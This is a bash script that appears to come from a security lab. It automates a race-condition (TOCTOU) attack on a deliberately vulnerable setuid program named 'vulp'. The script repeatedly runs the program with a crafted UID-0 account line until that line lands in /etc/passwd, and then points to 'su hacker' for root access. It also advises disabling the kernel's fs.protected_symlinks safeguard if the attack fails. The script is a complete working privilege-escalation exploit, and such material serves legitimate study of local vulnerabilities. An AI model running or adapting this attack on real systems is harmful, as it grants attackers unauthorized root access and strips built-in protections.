#!/bin/bash

# attack_race.sh - Automated race condition attack

echo "=== Race Condition Attack Demo ==="
echo "Target: Ubuntu 24.04"
echo

# Check if running as regular user
if [ "$EUID" -eq 0 ]; then
    echo "ERROR: Don't run this script as root!"
    exit 1
fi

# Prepare input for vulp
echo "hacker:x:0:0:Evil Hacker:/root:/bin/bash" > malicious_input.txt

# Compile attack program
echo "[+] Compiling attack program..."
gcc -o attack attack.c
if [ $? -ne 0 ]; then
    echo "ERROR: Failed to compile attack.c"
    exit 1
fi

# Check if vulp exists and has setuid bit
if [ ! -f "./vulp" ]; then
    echo "ERROR: vulp program not found"
    exit 1
fi

if [ ! -u "./vulp" ]; then
    echo "ERROR: vulp doesn't have setuid bit set"
    echo "Run: sudo chown root:root vulp && sudo chmod u+s vulp"
    exit 1
fi

# Backup original files
echo "[+] Creating backups..."
sudo cp /etc/passwd /etc/passwd.backup.$(date +%s)

# Show current /etc/passwd end
echo "[+] Current end of /etc/passwd:"
tail -3 /etc/passwd
echo

# Start the attack
echo "[+] Starting race condition attack..."
echo "[+] Running attack program in background..."

# Start attack program
./attack &
ATTACK_PID=$!

# Run vulp multiple times
echo "[+] Executing vulnerable program multiple times..."
for i in {1..5000}; do
    ./vulp < malicious_input.txt 2>/dev/null
    
    # Check for success every 100 iterations
    if [ $((i % 100)) -eq 0 ]; then
        if tail -1 /etc/passwd | grep -q "hacker"; then
            echo
            echo "SUCCESS! Attack succeeded after $i attempts!"
            break
        fi
        echo -n "."
    fi
    
    # Small delay between attempts
    sleep 0.001
done

# Stop attack program
kill $ATTACK_PID 2>/dev/null

echo
echo "[+] Attack finished"

# Check results
echo "[+] Checking /etc/passwd..."
if tail -5 /etc/passwd | grep -q "hacker"; then
    echo "SUCCESS: Malicious entry found in /etc/passwd!"
    echo "New entry:"
    tail -5 /etc/passwd | grep "hacker"
    echo
    echo "You can now try: su hacker"
    echo "WARNING: This is for educational purposes only!"
else
    echo "Attack failed. No malicious entry found."
    echo "Try:"
    echo "1. Reducing DELAY in vulp.c"
    echo "2. Disabling fs.protected_symlinks: sudo sysctl -w fs.protected_symlinks=0"
    echo "3. Running attack multiple times"
fi

echo
echo "[+] Cleaning up..."
rm -f malicious_input.txt
unlink /tmp/XYZ 2>/dev/null

echo "Done!"